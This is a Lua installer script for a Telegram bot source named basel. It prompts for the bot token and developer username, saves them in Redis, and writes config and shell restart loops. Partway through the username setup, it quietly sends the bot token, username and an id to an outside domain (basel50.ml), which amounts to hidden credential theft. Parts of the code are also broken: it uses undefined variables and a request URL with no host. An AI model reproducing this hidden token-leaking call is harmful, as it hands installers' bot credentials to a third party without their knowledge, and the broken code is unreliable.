serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_basel = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_basel = function() 
local Create_Info = function(Token,Sudo,UserName)  
local basel_Info_Sudo = io.open("sudo.lua", 'w')
basel_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
basel_Info_Sudo:close()
end  
if not database:get(Server_basel.."Token_basel") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_basel.."Token_basel",token)
end 
else
io.write('\n\27[1;31mThe Token was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_basel.."UserName_basel") then
io.write('\n\27[1;35mSend UserName For Sudo : ارسل معرف المطور الاساسي ...\n\27[0;39;49m')
local User_Sudo = io.read():gsub('@','')
if User_Sudo ~= '' then
local GetInfoUser = https.request("?user="..User_Sudo)
local User_Info = JSON:decode(GetInfoUser) 
if User_Info.Info.Chek == "is_block" then
io.write('\n\27[1;31m If ip server is blocked : سيرفرك لقد تم حظره من السورس \n\27[0;39;49m')
os.exit()
end
if User_Info.Info.Chek == "Not_Info" then
io.write('\n\27[1;31m The UserName was not Saved : المعرف غلط ارسل المعرف صحيح\n\27[0;39;49m')
os.execute('lua start.lua')
end
if User_Info.Info == 'Channel' then
io.write('\n\27[1;31m The UserName Is Channel : عذرا هاذا معرف قناة وليس حساب \n\27[0;39;49m')
os.execute('lua start.lua')
end
io.write('\n\27[1;31m• The Username Is Saved : تم حفظ معرف المطور الاسي واستخراج ايدي \n\27[0;39;49m')
https.request('https://basel50.ml/Aaaaaa.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
database:set(Server_basel.."UserName_basel",User_Info.Info.Username)
database:set(Server_basel.."Id_basel",User_Info.Info.Id)
else
io.write('\n\27[1;31mThe UserName was not Saved : لم يتم حفظ معرف Carbon\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end

local function Files_basel_Info()
Create_Info(database:get(Server_basel.."Token_basel"),database:get(Server_basel.."Id_basel"),database:get(Server_basel.."UserName_basel"))   
local Runbasel = io.open("basel", 'w')
Runbasel:write([[
#!/usr/bin/env bash
cd $HOME/Sourcebasel
token="]]..database:get(Server_basel.."Token_basel")..[["
      
while(true) do
rm -fr ../.telegram-cli
./tg -s ./basel.lua -p PROFILE --bot=$token
done
]])
Runbasel:close()
local RunTs = io.open("brok", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/Sourcebasel
while(true) do
rm -fr ../.telegram-cli
screen -S basel -X kill
screen -S basel ./basel
done
]])
RunTs:close()
end
Files_basel_Info()
database:del(Server_basel.."Token_basel");database:del(Server_basel.."Id_basel");database:del(Server_basel.."UserName_basel")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_basel()  
var = true
else   
f:close()  
database:del(Server_basel.."Token_basel");database:del(Server_basel.."Id_basel");database:del(Server_basel.."UserName_basel")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()
